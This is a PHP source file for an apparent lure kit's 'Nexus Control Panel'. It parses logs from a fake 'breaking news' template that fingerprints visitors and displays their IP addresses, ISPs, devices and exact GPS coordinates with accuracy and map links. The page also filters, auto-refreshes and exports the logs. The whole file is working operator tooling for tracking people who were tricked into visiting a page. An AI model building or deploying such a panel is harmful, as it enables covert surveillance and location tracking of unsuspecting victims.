<?php
session_start();
include "./assets/components/login-arc.php";

// Check authentication
if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }
}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/");
    change_token($client_token);
}
else {
    header('location: login.php');
    exit;
}

// Path to log file
$logFile = __DIR__ . '/templates/breaking_news/result.txt';

// Function to parse log entries
function parseLogFile($filePath) {
    if (!file_exists($filePath)) {
        return [];
    }
    
    $content = file_get_contents($filePath);
    $entries = [];
    
    // Split by entry separator
    $blocks = preg_split('/\[VISITOR FINGERPRINT - BREAKING NEWS TEMPLATE\]/', $content);
    
    foreach ($blocks as $block) {
        if (trim($block) == '') continue;
        
        $entry = [
            'timestamp' => '',
            'ip' => '',
            'country' => '',
            'city' => '',
            'browser' => '',
            'os' => '',
            'user_agent' => '',
            'latitude' => '',
            'longitude' => '',
            'location_type' => 'Unknown',
            'gps_granted' => false,
            'gps_accuracy' => '',
            'isp' => '',
            'raw_data' => $block
        ];
        
        // Extract key information
        if (preg_match('/Timestamp: (.+)/', $block, $matches)) {
            $entry['timestamp'] = trim($matches[1]);
        }
        if (preg_match('/Public IP Address: (.+)/', $block, $matches)) {
            $entry['ip'] = trim($matches[1]);
        }
        if (preg_match('/Country Name: (.+)/', $block, $matches)) {
            $entry['country'] = trim($matches[1]);
        }
        if (preg_match('/City Name: (.+)/', $block, $matches)) {
            $entry['city'] = trim($matches[1]);
        }
        if (preg_match('/Browser: (.+)/', $block, $matches)) {
            $entry['browser'] = trim($matches[1]);
        }
        if (preg_match('/OS: (.+)/', $block, $matches)) {
            $entry['os'] = trim($matches[1]);
        }
        if (preg_match('/User Agent: (.+)/', $block, $matches)) {
            $entry['user_agent'] = trim($matches[1]);
        }
        
        // Check for GPS location first (more accurate), then fallback to GeoIP
        if (preg_match('/Exact GPS Latitude: (.+)/', $block, $matches)) {
            $entry['latitude'] = trim($matches[1]);
            $entry['location_type'] = 'GPS (Exact)';
        } elseif (preg_match('/Latitude \(GeoIP\): (.+)/', $block, $matches)) {
            $entry['latitude'] = trim($matches[1]);
            $entry['location_type'] = 'GeoIP (Approximate)';
        } elseif (preg_match('/Latitude: (.+)/', $block, $matches)) {
            $entry['latitude'] = trim($matches[1]);
            $entry['location_type'] = 'GeoIP (Approximate)';
        }
        
        if (preg_match('/Exact GPS Longitude: (.+)/', $block, $matches)) {
            $entry['longitude'] = trim($matches[1]);
        } elseif (preg_match('/Longitude \(GeoIP\): (.+)/', $block, $matches)) {
            $entry['longitude'] = trim($matches[1]);
        } elseif (preg_match('/Longitude: (.+)/', $block, $matches)) {
            $entry['longitude'] = trim($matches[1]);
        }
        
        if (preg_match('/ISP: (.+)/', $block, $matches)) {
            $entry['isp'] = trim($matches[1]);
        }
        
        // Check if GPS location was granted
        if (preg_match('/=== GPS LOCATION UPDATE ===/', $block)) {
            $entry['gps_granted'] = true;
            if (preg_match('/GPS Accuracy: (.+)/', $block, $matches)) {
                $entry['gps_accuracy'] = trim($matches[1]);
            }
        } else {
            $entry['gps_granted'] = false;
        }
        
        $entries[] = $entry;
    }
    
    // Reverse to show newest first
    return array_reverse($entries);
}

// Get all entries
$allEntries = parseLogFile($logFile);

// Filtering
$filterCountry = isset($_GET['country']) ? $_GET['country'] : '';
$filterIP = isset($_GET['ip']) ? $_GET['ip'] : '';
$filterBrowser = isset($_GET['browser']) ? $_GET['browser'] : '';
$searchTerm = isset($_GET['search']) ? $_GET['search'] : '';

$filteredEntries = $allEntries;

if ($filterCountry) {
    $filteredEntries = array_filter($filteredEntries, function($e) use ($filterCountry) {
        return stripos($e['country'], $filterCountry) !== false;
    });
}

if ($filterIP) {
    $filteredEntries = array_filter($filteredEntries, function($e) use ($filterIP) {
        return stripos($e['ip'], $filterIP) !== false;
    });
}

if ($filterBrowser) {
    $filteredEntries = array_filter($filteredEntries, function($e) use ($filterBrowser) {
        return stripos($e['browser'], $filterBrowser) !== false;
    });
}

if ($searchTerm) {
    $filteredEntries = array_filter($filteredEntries, function($e) use ($searchTerm) {
        return stripos($e['raw_data'], $searchTerm) !== false;
    });
}

$filteredEntries = array_values($filteredEntries);

// Statistics
$totalVisitors = count($allEntries);
$uniqueIPs = count(array_unique(array_column($allEntries, 'ip')));
$countries = array_count_values(array_column($allEntries, 'country'));
arsort($countries);
$browsers = array_count_values(array_column($allEntries, 'browser'));
arsort($browsers);
$osList = array_count_values(array_column($allEntries, 'os'));
arsort($osList);

// Pagination
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$perPage = 25;
$totalPages = ceil(count($filteredEntries) / $perPage);
$offset = ($page - 1) * $perPage;
$paginatedEntries = array_slice($filteredEntries, $offset, $perPage);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Analytics - Nexus Control Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="./assets/css/dashboard.css">
    <style>
        .stats-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .stats-card h3 {
            font-size: 2.5rem;
            font-weight: bold;
            margin: 0;
        }
        .stats-card p {
            margin: 5px 0 0 0;
            opacity: 0.9;
        }
        .visitor-row {
            transition: all 0.3s ease;
        }
        .visitor-row:hover {
            background-color: #f8f9fa;
            transform: translateX(5px);
        }
        .badge-custom {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.85rem;
        }
        .filter-section {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .map-link {
            color: #667eea;
            text-decoration: none;
        }
        .map-link:hover {
            text-decoration: underline;
        }
        .detail-modal {
            max-height: 70vh;
            overflow-y: auto;
        }
        .pre-wrap {
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
        }
    </style>
</head>
<body id="ourbody">
    
    <!-- Header -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="panel.php">
                <i class="fas fa-network-wired"></i> Nexus Control Panel
            </a>
            <div class="ms-auto">
                <a href="panel.php" class="btn btn-sm btn-outline-light">
                    <i class="fas fa-arrow-left"></i> Back to Dashboard
                </a>
            </div>
        </div>
    </nav>

    <div class="container-fluid main-container" style="margin-top: 70px;">
        <div class="row">
            <!-- Main Content -->
            <div class="col-12">
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <h2><i class="fas fa-users"></i> Visitor Analytics</h2>
                    <div>
                        <button class="btn btn-primary" onclick="exportData()">
                            <i class="fas fa-download"></i> Export Data
                        </button>
                        <button class="btn btn-success" onclick="location.reload()">
                            <i class="fas fa-sync"></i> Refresh
                        </button>
                    </div>
                </div>

                <!-- Statistics Cards -->
                <div class="row mb-4">
                    <div class="col-md-3">
                        <div class="stats-card" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
                            <h3><?php echo number_format($totalVisitors); ?></h3>
                            <p><i class="fas fa-users"></i> Total Visitors</p>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stats-card" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">
                            <h3><?php echo number_format($uniqueIPs); ?></h3>
                            <p><i class="fas fa-network-wired"></i> Unique IPs</p>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stats-card" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">
                            <h3><?php echo count($countries); ?></h3>
                            <p><i class="fas fa-globe"></i> Countries</p>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stats-card" style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);">
                            <h3><?php echo count($filteredEntries); ?></h3>
                            <p><i class="fas fa-filter"></i> Filtered Results</p>
                        </div>
                    </div>
                </div>

                <!-- Filters -->
                <div class="filter-section">
                    <form method="GET" class="row g-3">
                        <div class="col-md-3">
                            <label class="form-label">Search</label>
                            <input type="text" class="form-control" name="search" value="<?php echo htmlspecialchars($searchTerm); ?>" placeholder="Search anything...">
                        </div>
                        <div class="col-md-2">
                            <label class="form-label">Country</label>
                            <input type="text" class="form-control" name="country" value="<?php echo htmlspecialchars($filterCountry); ?>" placeholder="Filter by country">
                        </div>
                        <div class="col-md-2">
                            <label class="form-label">IP Address</label>
                            <input type="text" class="form-control" name="ip" value="<?php echo htmlspecialchars($filterIP); ?>" placeholder="Filter by IP">
                        </div>
                        <div class="col-md-2">
                            <label class="form-label">Browser</label>
                            <input type="text" class="form-control" name="browser" value="<?php echo htmlspecialchars($filterBrowser); ?>" placeholder="Filter by browser">
                        </div>
                        <div class="col-md-3">
                            <label class="form-label">&nbsp;</label>
                            <div>
                                <button type="submit" class="btn btn-primary w-100">
                                    <i class="fas fa-search"></i> Apply Filters
                                </button>
                            </div>
                        </div>
                    </form>
                    <?php if ($filterCountry || $filterIP || $filterBrowser || $searchTerm): ?>
                    <div class="mt-2">
                        <a href="visitor_analytics.php" class="btn btn-sm btn-outline-secondary">
                            <i class="fas fa-times"></i> Clear Filters
                        </a>
                    </div>
                    <?php endif; ?>
                </div>

                <!-- Top Countries & Browsers -->
                <div class="row mb-4">
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">
                                <h5><i class="fas fa-globe"></i> Top Countries</h5>
                            </div>
                            <div class="card-body">
                                <?php $count = 0; foreach ($countries as $country => $visits): if ($count++ >= 10) break; ?>
                                <div class="d-flex justify-content-between mb-2">
                                    <span><?php echo htmlspecialchars($country ?: 'Unknown'); ?></span>
                                    <span class="badge bg-primary"><?php echo $visits; ?></span>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-header">
                                <h5><i class="fas fa-window-maximize"></i> Top Browsers</h5>
                            </div>
                            <div class="card-body">
                                <?php $count = 0; foreach ($browsers as $browser => $visits): if ($count++ >= 10) break; ?>
                                <div class="d-flex justify-content-between mb-2">
                                    <span><?php echo htmlspecialchars($browser ?: 'Unknown'); ?></span>
                                    <span class="badge bg-info"><?php echo $visits; ?></span>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Visitors Table -->
                <div class="card">
                    <div class="card-header">
                        <h5><i class="fas fa-list"></i> Visitor Records (<?php echo count($filteredEntries); ?> total)</h5>
                    </div>
                    <div class="card-body">
                        <?php if (count($paginatedEntries) > 0): ?>
                        <div class="table-responsive">
                            <table class="table table-hover">
                                <thead>
                                    <tr>
                                        <th>Timestamp</th>
                                        <th>IP Address</th>
                                        <th>Location</th>
                                        <th>Browser</th>
                                        <th>OS</th>
                                        <th>ISP</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($paginatedEntries as $entry): ?>
                                    <tr class="visitor-row">
                                        <td>
                                            <small><?php echo htmlspecialchars($entry['timestamp']); ?></small>
                                        </td>
                                        <td>
                                            <code><?php echo htmlspecialchars($entry['ip']); ?></code>
                                        </td>
                                        <td>
                                            <?php if ($entry['city'] && $entry['city'] != 'Unknown'): ?>
                                                <strong><?php echo htmlspecialchars($entry['city']); ?></strong><br>
                                            <?php endif; ?>
                                            <span class="badge bg-secondary"><?php echo htmlspecialchars($entry['country'] ?: 'Unknown'); ?></span>
                                            <?php if ($entry['gps_granted']): ?>
                                                <br><span class="badge bg-success"><i class="fas fa-crosshairs"></i> GPS Granted</span>
                                            <?php endif; ?>
                                            <?php if ($entry['latitude'] != 'Unknown' && $entry['longitude'] != 'Unknown'): ?>
                                                <br>
                                                <small class="text-muted"><?php echo htmlspecialchars($entry['location_type']); ?></small>
                                                <br><a href="https://www.google.com/maps?q=<?php echo urlencode($entry['latitude'] . ',' . $entry['longitude']); ?>" target="_blank" class="map-link">
                                                    <i class="fas fa-map-marker-alt"></i> Map
                                                </a>
                                                <?php if ($entry['gps_accuracy']): ?>
                                                    <br><small class="text-muted">Accuracy: <?php echo htmlspecialchars($entry['gps_accuracy']); ?></small>
                                                <?php endif; ?>
                                            <?php endif; ?>
                                        </td>
                                        <td>
                                            <span class="badge badge-custom bg-primary"><?php echo htmlspecialchars($entry['browser'] ?: 'Unknown'); ?></span>
                                        </td>
                                        <td>
                                            <span class="badge badge-custom bg-success"><?php echo htmlspecialchars($entry['os'] ?: 'Unknown'); ?></span>
                                        </td>
                                        <td>
                                            <small><?php echo htmlspecialchars($entry['isp'] ?: 'Unknown'); ?></small>
                                        </td>
                                        <td>
                                            <button class="btn btn-sm btn-info" onclick='showDetails(<?php echo json_encode(base64_encode($entry['raw_data'])); ?>)'>
                                                <i class="fas fa-eye"></i> Details
                                            </button>
                                        </td>
                                    </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>

                        <!-- Pagination -->
                        <?php if ($totalPages > 1): ?>
                        <nav>
                            <ul class="pagination justify-content-center">
                                <?php
                                $queryParams = $_GET;
                                for ($i = 1; $i <= $totalPages; $i++):
                                    $queryParams['page'] = $i;
                                    $url = '?' . http_build_query($queryParams);
                                ?>
                                <li class="page-item <?php echo $i == $page ? 'active' : ''; ?>">
                                    <a class="page-link" href="<?php echo $url; ?>"><?php echo $i; ?></a>
                                </li>
                                <?php endfor; ?>
                            </ul>
                        </nav>
                        <?php endif; ?>

                        <?php else: ?>
                        <div class="alert alert-info">
                            <i class="fas fa-info-circle"></i> No visitor records found.
                        </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Details Modal -->
    <div class="modal fade" id="detailsModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Visitor Details</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body detail-modal">
                    <div id="detailsContent" class="pre-wrap"></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function showDetails(encodedData) {
            const rawData = atob(encodedData);
            document.getElementById('detailsContent').textContent = rawData;
            new bootstrap.Modal(document.getElementById('detailsModal')).show();
        }

        function exportData() {
            window.location.href = 'visitor_analytics.php?export=1';
        }

        // Auto-refresh every 30 seconds
        setTimeout(function() {
            if (document.visibilityState === 'visible') {
                location.reload();
            }
        }, 30000);
    </script>
</body>
</html>

<?php
// Handle export
if (isset($_GET['export']) && $_GET['export'] == '1') {
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="visitor_logs_' . date('Y-m-d') . '.txt"');
    readfile($logFile);
    exit;
}
?>

